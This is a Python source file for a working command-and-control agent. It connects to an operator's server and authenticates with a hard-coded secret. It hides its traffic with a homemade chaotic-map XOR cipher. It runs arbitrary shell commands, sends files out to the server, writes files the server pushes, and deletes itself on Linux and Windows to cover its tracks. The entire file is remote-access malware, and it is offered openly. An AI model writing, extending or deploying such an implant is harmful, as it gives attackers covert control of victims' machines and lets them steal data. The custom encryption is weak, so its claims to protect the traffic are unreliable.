import socket
import base64
import os
import subprocess
import time
import hashlib
import sys
import threading

# Hard-coded shared secret for demonstration
# Ensure this matches the server's shared_secret
SHARED_SECRET = "9C0FsLqtN4g6gpBJrplJDQZFHaeF6IGz"

# Chaos Encoding Methods
def generate_chaotic_keys(length, r, x0):
    """Generate pseudo-random keys using the Logistic Map."""
    x = x0
    chaotic_keys = []
    for _ in range(length):
        x = r * x * (1 - x)
        chaotic_value = int(x * 255)
        while chaotic_value == 0:
            x = r * x * (1 - x)
            chaotic_value = int(x * 255)
        chaotic_keys.append(chaotic_value)
    return chaotic_keys

def get_hour_block_parameters(secret, tolerance=1):
    """Generate dynamic encryption keys based on the shared secret and time."""
    current_hour = int(time.time() // 3600)  # Current hour as a block
    parameters = []
    for offset in range(-tolerance, tolerance + 1):
        combined = f"{secret}{current_hour + offset}"
        hash_value = hashlib.sha256(combined.encode()).hexdigest()
        x0 = int(hash_value[:8], 16) / 0xFFFFFFFF
        r = 3.99 + (int(hash_value[8:12], 16) % 1000) / 100000
        parameters.append((r, x0))
    return parameters

def encrypt(data, keys):
    """Encrypt or decrypt data using XOR with chaotic keys."""
    return bytearray([data[i] ^ keys[i % len(keys)] for i in range(len(data))])

def connect_to_c2(server_ip, server_port):
    """Establish connection to the C2 server on the primary port."""
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            print("[+] Connected to C2 server on primary port")

            # Wait for REQUEST_SECRET prompt from server
            prompt = client_socket.recv(1024)
            if prompt.strip() != b"REQUEST_SECRET":
                print("[-] Did not receive REQUEST_SECRET from server. Reconnecting...")
                client_socket.close()
                time.sleep(10)
                continue

            # Send the shared secret for authentication
            client_socket.send(base64.b64encode(SHARED_SECRET.encode('utf-8')))

            # Wait for authorization response
            auth_response = client_socket.recv(1024)
            try:
                auth_response = base64.b64decode(auth_response).decode('utf-8')
            except Exception:
                auth_response = "UNAUTHORIZED"

            if auth_response != "AUTHORIZED":
                print("[-] Authentication failed.")
                client_socket.close()
                time.sleep(10)
                continue

            print("[+] Authentication successful.")

            # Receive unique port assignment
            unique_port_data = client_socket.recv(1024).decode('utf-8')
            unique_port = int(unique_port_data)
            print(f"[+] Assigned unique port: {unique_port}")
            client_socket.close()

            # Connect to the unique port for actual command handling
            # Do not break here, keep the main thread alive
            threading.Thread(target=handle_unique_port, args=(server_ip, unique_port), daemon=True).start()

            # Keep the main thread alive
            while True:
                time.sleep(10)

        except Exception as e:
            print(f"[-] Error: {e}. Reconnecting in 10 seconds...")
            time.sleep(10)

def handle_unique_port(server_ip, unique_port):
    """Handle the assigned unique port connection."""
    while True:
        try:
            unique_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            unique_socket.connect((server_ip, unique_port))
            print(f"[+] Connected to unique port {unique_port}")

            listen_for_commands(unique_socket, SHARED_SECRET)
            # If connection breaks, attempt reconnect after a delay
            time.sleep(10)
        except Exception as e:
            print(f"[-] Error connecting to unique port {unique_port}: {e}")
            time.sleep(10)

def listen_for_commands(client_socket, shared_secret):
    """Listen for commands from the C2 server and execute them."""
    while True:
        try:
            raw_data = client_socket.recv(4096)
            if not raw_data:
                # Connection closed by server
                print("[-] No data received. Server might have closed the connection.")
                break

            encrypted_command = base64.b64decode(raw_data)
            r, x0 = get_hour_block_parameters(shared_secret)[0]
            keys = generate_chaotic_keys(len(encrypted_command), r, x0)
            command = encrypt(encrypted_command, keys).decode("utf-8").strip()

            if command.lower() == "exit":
                print("[+] Received 'exit' command. Closing connection.")
                client_socket.close()
                break
            elif command.lower() == "kill":
                print("[+] Received 'kill' command. Self-destructing.")
                client_socket.close()
                delete_self()
                break
            elif command.lower().startswith("cd "):
                change_directory(command, client_socket, shared_secret)
            elif command.lower().startswith("download "):
                send_file(command, client_socket, shared_secret)
            elif command.lower().startswith("upload "):
                receive_file(command, client_socket, shared_secret)
            else:
                execute_command(command, client_socket, shared_secret)
        except Exception as e:
            print(f"[-] Error processing command: {e}")
            break

def change_directory(command, client_socket, shared_secret):
    try:
        path = command.split(" ", 1)[1]
        os.chdir(path)
        response = f"Changed directory to: {os.getcwd()}"
    except Exception as e:
        response = f"Error: {str(e)}"
    send_response(client_socket, response, shared_secret)

def execute_command(command, client_socket, shared_secret):
    try:
        output = subprocess.getoutput(command)
    except Exception as e:
        output = f"Error: {str(e)}"
    send_response(client_socket, output, shared_secret)

def send_file(command, client_socket, shared_secret):
    # Server wants to download a file from the agent
    try:
        filename = command.split(" ", 1)[1]
        if not os.path.isfile(filename):
            send_response(client_socket, f"Error: File {filename} does not exist.", shared_secret)
            return
        send_response(client_socket, f"Sending file: {filename}", shared_secret)
        with open(filename, "rb") as f:
            file_data = base64.b64encode(f.read())
        client_socket.send(file_data)
    except Exception as e:
        send_response(client_socket, f"Error: {str(e)}", shared_secret)

def receive_file(command, client_socket, shared_secret):
    # Server wants the agent to receive a file
    try:
        filename = command.split(" ", 1)[1]
        # First, send acknowledgment
        send_response(client_socket, f"Ready to receive file: {filename}", shared_secret)
        file_data = client_socket.recv(8192)
        with open(filename, "wb") as f:
            f.write(base64.b64decode(file_data))
        send_response(client_socket, f"File {filename} received successfully.", shared_secret)
    except Exception as e:
        send_response(client_socket, f"Error: {str(e)}", shared_secret)

def send_response(client_socket, response, shared_secret):
    r, x0 = get_hour_block_parameters(shared_secret)[0]
    keys = generate_chaotic_keys(len(response), r, x0)
    encrypted_response = encrypt(response.encode("utf-8"), keys)
    client_socket.send(base64.b64encode(encrypted_response))

def delete_self():
    file_path = os.path.abspath(__file__)
    if os.name != 'nt':  # For Linux/MacOS
        subprocess.Popen(f"rm -f '{file_path}'", shell=True)
    else:  # For Windows
        batch_file = f"{file_path}.bat"
        # Write a batch script that deletes the file and then deletes itself
        with open(batch_file, 'w') as f:
            f.write(f"""@echo off
:loop
del "{file_path}" >nul 2>&1
if exist "{file_path}" goto loop
del "%~f0" >nul 2>&1
""")
        subprocess.Popen(batch_file, shell=True)
    sys.exit(0)

if __name__ == "__main__":
    SERVER_IP = input("[+] Enter IP address of C2: ")
    SERVER_PORT = 5050  # Primary port for agent connection
    connect_to_c2(SERVER_IP, SERVER_PORT)
